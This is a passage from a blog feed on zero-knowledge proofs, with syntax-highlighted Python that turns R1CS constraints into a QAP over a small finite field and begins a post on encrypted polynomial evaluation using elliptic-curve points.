style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    [&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;78&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;])
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;finite-field-arithmetic-in-python&quot;&gt;Finite Field Arithmetic in Python&lt;&#x2F;h3&gt;
&lt;p&gt;We can convert them to field arrays simply by wrapping them with GF like the following:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span&gt;L_galois &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;GF&lt;&#x2F;span&gt;&lt;span&gt;(L)
&lt;&#x2F;span&gt;&lt;span&gt;R_galois &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;GF&lt;&#x2F;span&gt;&lt;span&gt;(R)
&lt;&#x2F;span&gt;&lt;span&gt;O_galois &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;GF&lt;&#x2F;span&gt;&lt;span&gt;(O)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;x &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;GF&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;y &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;GF&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;79&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# we are using 79 as the field size, so 79 - 2 is -2
&lt;&#x2F;span&gt;&lt;span&gt;v1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;x &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;x
&lt;&#x2F;span&gt;&lt;span&gt;v2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;v1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;v1         &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# x^4
&lt;&#x2F;span&gt;&lt;span&gt;v3 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;GF&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;79&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;5&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt;y &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;y
&lt;&#x2F;span&gt;&lt;span&gt;out &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;v3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt;v1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;v2    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# -5y^2 * x^2
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;witness &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;GF&lt;&#x2F;span&gt;&lt;span&gt;(np&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;array&lt;&#x2F;span&gt;&lt;span&gt;([&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;out&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;x&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;y&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;v1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;v2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;v3]))
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;assert &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;all&lt;&#x2F;span&gt;&lt;span&gt;(np&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;equal&lt;&#x2F;span&gt;&lt;span&gt;(np&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;matmul&lt;&#x2F;span&gt;&lt;span&gt;(L_galois&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;witness) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;np&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;matmul&lt;&#x2F;span&gt;&lt;span&gt;(R_galois&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;witness)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;np&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;matmul&lt;&#x2F;span&gt;&lt;span&gt;(O_galois&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;witness))), &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;not equal&amp;quot;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;and then do the lagrange interpolation for our computation&lt;&#x2F;p&gt;
&lt;h3 id=&quot;polynomial-interpolation-in-finite-fields&quot;&gt;Polynomial interpolation in finite fields&lt;&#x2F;h3&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;interpolate_column&lt;&#x2F;span&gt;&lt;span&gt;(col):
&lt;&#x2F;span&gt;&lt;span&gt;    xs &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;GF&lt;&#x2F;span&gt;&lt;span&gt;(np&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;array&lt;&#x2F;span&gt;&lt;span&gt;([&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span&gt;]))
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;galois&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;lagrange_poly&lt;&#x2F;span&gt;&lt;span&gt;(xs&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;col)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# axis 0 is the columns. apply_along_axis is the same as doing a for loop over the columns and collecting the results in an array
&lt;&#x2F;span&gt;&lt;span&gt;U_polys &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;np&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;apply_along_axis&lt;&#x2F;span&gt;&lt;span&gt;(interpolate_column&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;L_galois)
&lt;&#x2F;span&gt;&lt;span&gt;V_polys &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;np&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;apply_along_axis&lt;&#x2F;span&gt;&lt;span&gt;(interpolate_column&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;R_galois)
&lt;&#x2F;span&gt;&lt;span&gt;W_polys &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;np&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;apply_along_axis&lt;&#x2F;span&gt;&lt;span&gt;(interpolate_column&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;O_galois)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;computing-h-x&quot;&gt;Computing h(x)&lt;&#x2F;h3&gt;
&lt;p&gt;t(x) will be (x - 1)(x - 2)(x - 3)(x - 4) by interpolation, since we’ve introduct this in the last episode.&lt;&#x2F;p&gt;
&lt;p&gt;Each of the terms is taking the inner product of the witness with the column-interpolating polynomials. That is, each of summation terms are effectively the inner product between &amp;lt;1, a₁, …, aₘ&amp;gt; and &amp;lt;u₀(x), u₁(x), …, uₘ(x)&amp;gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;inner_product_polynomials_with_witness&lt;&#x2F;span&gt;&lt;span&gt;(polys&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;witness):
&lt;&#x2F;span&gt;&lt;span&gt;    mul_ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= lambda &lt;&#x2F;span&gt;&lt;span&gt;x&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;y: x &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;y
&lt;&#x2F;span&gt;&lt;span&gt;    sum_ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= lambda &lt;&#x2F;span&gt;&lt;span&gt;x&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;y: x &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;y
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;reduce&lt;&#x2F;span&gt;&lt;span&gt;(sum_&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;map&lt;&#x2F;span&gt;&lt;span&gt;(mul_&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;polys&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;witness))
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;term_1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;inner_product_polynomials_with_witness&lt;&#x2F;span&gt;&lt;span&gt;(U_polys&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;witness)
&lt;&#x2F;span&gt;&lt;span&gt;term_2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;inner_product_polynomials_with_witness&lt;&#x2F;span&gt;&lt;span&gt;(V_polys&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;witness)
&lt;&#x2F;span&gt;&lt;span&gt;term_3 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;inner_product_polynomials_with_witness&lt;&#x2F;span&gt;&lt;span&gt;(W_polys&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;witness)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Note that we cannot compute h(x) unless we have a valid witness, as we have combined the witness into our polynomials.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# t = (x - 1)(x - 2)(x - 3)(x - 4)
&lt;&#x2F;span&gt;&lt;span&gt;t &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;galois&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Poly&lt;&#x2F;span&gt;&lt;span&gt;([&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;78&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;field &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= GF&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;galois&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Poly&lt;&#x2F;span&gt;&lt;span&gt;([&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;77&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;field &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= GF&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;galois&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Poly&lt;&#x2F;span&gt;&lt;span&gt;([&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;76&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;field &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= GF&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;galois&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Poly&lt;&#x2F;span&gt;&lt;span&gt;([&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;75&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;field &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= GF&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;h &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;(term_1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;term_2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span&gt;term_3) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&#x2F;&#x2F; &lt;&#x2F;span&gt;&lt;span&gt;t
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Unlike poly1d from numpy, the galois library won’t indicate to us if there is a remainder, so we need to check if the QAP formula is still true.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;assert &lt;&#x2F;span&gt;&lt;span&gt;term_1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;term_2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span&gt;term_3 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;h &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;t, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;division has a remainder&amp;quot;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Encrypted Polynomial Evalution</title>
        <published>2024-03-10T00:00:00+08:00</published>
        <updated>2024-03-10T00:00:00+08:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="/blog/zknote/post-12/"/>
        <id>/blog/zknote/post-12/</id>
        
        <content type="html" xml:base="/blog/zknote/post-12/">&lt;h3 id=&quot;encrypted-polynomial-evaluation&quot;&gt;Encrypted Polynomial Evaluation&lt;&#x2F;h3&gt;
&lt;h3 id=&quot;encrypted-exponentiation&quot;&gt;Encrypted Exponentiation&lt;&#x2F;h3&gt;
&lt;p&gt;Known pairing mappings satisfy the requirement for single-multiplication homomorphisms (Further pairings lead to huge dimensions, which is unacceptable for concise zkp), but we still need to do homomorphic encryption for exponents.&lt;&#x2F;p&gt;
&lt;p&gt;For that purpose, we could let prover computes the encrypted value of $x$, $x^2$, and $x_3$ and gives those the verifier separately. The supplied cryptographic parameters are still valid for the verifier because the supplied cryptographic parameters are within a computable (given) elliptic curve group.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;py_ecc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;bn128 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;G1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;multiply&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;add&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;neg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;eq
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# Prover
&lt;&#x2F;span&gt;&lt;span&gt;x &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;5
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;X3 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;multiply&lt;&#x2F;span&gt;&lt;span&gt;(G1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;5&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;**&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;X2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;multiply&lt;&#x2F;span&gt;&lt;span&gt;(G1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;5&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;**&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;)
